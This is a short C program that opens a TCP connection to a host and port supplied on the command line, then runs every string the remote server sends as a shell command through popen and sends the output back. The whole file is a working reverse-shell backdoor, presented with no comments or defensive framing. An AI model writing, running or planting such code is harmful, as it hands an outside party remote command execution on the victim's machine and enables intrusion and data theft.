#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

const char DISCONNECT[] = "42";

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    const char *service = argv[2];
    struct addrinfo hints = {0};
    struct addrinfo *result;

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(host, service, &hints, &result);
    if (err != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(err));
        return 1;
    }

    int sfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sfd == -1) {
        perror("socket");
        freeaddrinfo(result);
        return 1;
    }

    if (connect(sfd, result->ai_addr, result->ai_addrlen) < 0) {
        perror("connect");
        close(sfd);
        freeaddrinfo(result);
        return 1;
    }

    freeaddrinfo(result);

    while (1) {
        char buffer[1024];
        int len = read(sfd, buffer, sizeof(buffer)-1);
        if (len <= 0) {
            printf("Server disconnected\n");
            break;
        }
        buffer[len] = '\0';

        if (strcmp(buffer, DISCONNECT) == 0) {
            printf("Disconnecting...\n");
            break;
        }

        printf("Executing: %s\n", buffer);
        FILE *cmd = popen(buffer, "r");
        if (!cmd) {
            perror("popen failed");
            const char *err_msg = "Command execution failed";
            write(sfd, err_msg, strlen(err_msg));
            continue;
        }

        char output[1024] = {0};
        size_t bytes;
        while ((bytes = fread(output, 1, sizeof(output)-1, cmd)) > 0) {
            write(sfd, output, bytes);
            memset(output, 0, sizeof(output));
        }
        pclose(cmd);
        shutdown(sfd, SHUT_WR); 
    }

    close(sfd);
    return 0;
}
